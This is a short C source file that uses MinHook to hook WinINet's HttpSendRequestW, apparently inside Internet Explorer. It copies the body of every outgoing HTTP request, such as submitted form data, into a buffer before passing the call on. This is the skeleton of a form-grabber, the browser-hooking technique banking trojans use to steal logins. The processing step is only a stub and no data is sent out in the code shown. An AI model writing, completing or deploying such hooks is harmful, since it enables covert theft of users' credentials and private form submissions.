
#include <windows.h>
#include <WinInet.h>
#include "../stdlib.h"
#include "headers.h"
#include "../minhook/include/minhook.h"

typedef BOOL(__stdcall *Orig_HttpSendRequestW)(LPVOID hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength);
Orig_HttpSendRequestW OG_HttpSendRequestW;
//stdcall is winapi
BOOL __stdcall FAKE_HttpSendRequestW(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)
{
	if (lpOptional && dwOptionalLength > 0)
	{
		LPVOID HEADERDATA = HeapAlloc(GetProcessHeap(), 0, dwOptionalLength + 1);
		if (HEADERDATA)
		{
/*
if(~dwHeadersLength == 0){
headerlength = wcslen(lpszHeaders) * 2;
}
else{
headerlength = dwHeadersLength * 2;

*/
			DWORD headerlength = ~dwHeadersLength == 0 ? wcslen(lpszHeaders) * 2 : dwHeadersLength * 2;
			RtlSecureZeroMemory(HEADERDATA, dwOptionalLength + 1);

			_memcpy(HEADERDATA, lpOptional, dwOptionalLength);
			//header code here
			HeapFree(GetProcessHeap(), 0, HEADERDATA);
		}
	}
	return OG_HttpSendRequestW(hRequest, lpszHeaders, dwHeadersLength, lpOptional, dwOptionalLength);
}
void INTERNETEXPLORERMEME()
{
	MH_Initialize();
	MH_CreateHookApi(L"wininet.dll", "HttpSendRequestW", FAKE_HttpSendRequestW, (LPVOID *)&OG_HttpSendRequestW);
	MH_EnableHook(MH_ALL_HOOKS);
}
